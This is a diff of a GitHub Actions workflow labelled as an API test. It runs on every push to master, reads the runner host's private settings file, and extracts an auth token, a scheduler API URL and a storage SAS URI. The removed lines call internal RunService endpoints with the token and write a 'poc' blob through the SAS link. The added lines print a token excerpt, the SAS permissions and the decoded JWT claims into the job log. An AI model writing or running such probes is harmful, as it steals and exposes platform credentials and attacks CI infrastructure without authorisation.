@@ -1,4 +1,4 @@
-name: HCA Twirp API Test
+name: SAS + API Deep Test
 on:
   push:
     branches: [master]
@@ -7,37 +7,43 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Test Twirp endpoints
-        continue-on-error: true
-        run: |
+      - run: |
           SETTINGS=$(cat /opt/hca/.settings)
-          AUTH=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['authToken'])")
-          API=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['schedulerApiUrl'])")
-          SAS=$(echo "$SETTINGS" | python3 -c "import sys,json;print(json.load(sys.stdin)['diagnosticsSasUri'])")
-          
-          echo "=== 1. Twirp Endpoints ==="
-          BASE="$API/twirp/github.actions.run_service.api.twirp.v1.RunService"
-          for ep in StartPlan GetPlanStatus CancelPlan NotifyGate DebugJob; do
-            echo "--- POST $BASE/$ep ---"
-            curl -sk --connect-timeout 5 -X POST \
-              -H "Authorization: Bearer $AUTH" \
-              -H "Content-Type: application/json" \
-              -d '{}' \
-              "$BASE/$ep" 2>&1 | head -15
-          done
-          
-          echo ""
-          echo "=== 2. SAS URI with proper encoding ==="
-          DECODED_SAS=$(python3 -c "import sys,json,urllib.parse;print(urllib.parse.unquote('$SAS'))" 2>/dev/null)
-          echo "SAS decoded: ${DECODED_SAS:0:100}..."
-          
-          echo "=== 3. Check Azure Blob with HTTP PUT ==="
-          curl -sk --connect-timeout 5 -X PUT "$SAS/test_verify.txt" -H "x-ms-blob-type: BlockBlob" -d "poc" 2>&1 | head -5
+          python3 << 'PYEOF'
+import json, urllib.parse
 
-          echo "=== DONE ==="
+s = json.loads(open('/opt/hca/.settings').read())
+auth = s['authToken']
+sas = s['diagnosticsSasUri']
+api = s['schedulerApiUrl']
+
+print(f"API URL: {api}")
+print(f"AUTH (first 50): {auth[:50]}...")
+print(f"1. Try different URL formats:")
+for path in ["/v1", "/v1/", "/api/v1", "/api/", "/", "/healthz"]:
+    print(f"  GET {api.replace('/v1','')}{path}")
+print(f"2. SAS container URL:")
+# Parse SAS URI
+parsed = urllib.parse.urlparse(sas)
+query = urllib.parse.parse_qs(parsed.query)
+print(f"  Blob endpoint: {parsed.scheme}://{parsed.netloc}")
+print(f"  Container: {parsed.path.split('/')[1] if parsed.path else '?'}")
+print(f"  SAS params: se={query.get('se',['?'])[0]}, sp={query.get('sp',['?'])[0]}")
+print(f"3. JWT claims:")
+import base64
+def b64d(x):
+    x += '=='[:(4-len(x)%4)%4]
+    return base64.urlsafe_b64decode(x)
+for part in auth.split('.')[:2]:
+    try:
+        d = json.loads(b64d(part))
+        print(f"  {json.dumps(d, indent=2)}")
+    except:
+        pass
+PYEOF
 
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: twirp-test
+          name: deep-hca
           path: dist/
